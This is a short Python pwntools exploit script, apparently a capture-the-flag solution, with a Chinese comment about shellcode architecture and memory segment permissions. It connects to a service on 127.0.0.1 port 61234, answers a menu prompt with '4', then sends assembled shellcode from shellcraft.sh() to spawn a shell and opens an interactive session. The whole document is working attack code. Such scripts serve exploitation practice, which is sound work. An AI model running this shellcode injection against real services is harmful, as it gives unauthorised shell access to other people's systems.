# shellcode 注意架构 段权限问题
from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

# p = process('./pwn')
p = remote('127.0.0.1',61234)

payload = b'4'

p.recvuntil(b'ly!\n')
p.sendline(payload)

p.recvuntil(b'set.\n')
p.send(asm(shellcraft.sh()))

p.interactive()